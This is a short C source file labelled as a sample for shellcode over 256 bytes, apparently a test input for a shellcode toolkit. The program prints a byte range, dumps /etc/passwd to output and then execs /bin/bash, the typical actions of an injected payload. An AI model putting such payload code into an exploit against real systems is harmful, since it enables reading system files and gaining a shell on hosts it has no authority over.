/* sample for shellcode > 256 byte
 */
#include "../../lib/int80.h"

#define my_bzero(x,y) {int j=0;for(;j<y;j++)x[j]=0;}

int main()
{
   	int i = 0, fd = 0, r = 0;
        char c;
        char *a[] = {"/bin/bash", 0};
        char *pwdfile = "/etc/passwd";
        char buf[100] = {0};
        
        for (i = 35; i < 200; i++) {
           	c = (char)i;
           	write(1, &c, 1);
        }
        fd = open(pwdfile, O_RDONLY, 0600);
        while ((r = read(fd, buf, 100)) > 0) {
           	write(1, buf, r);
                my_bzero(buf,100);
        }
        execve(a[0], a, 0);
}

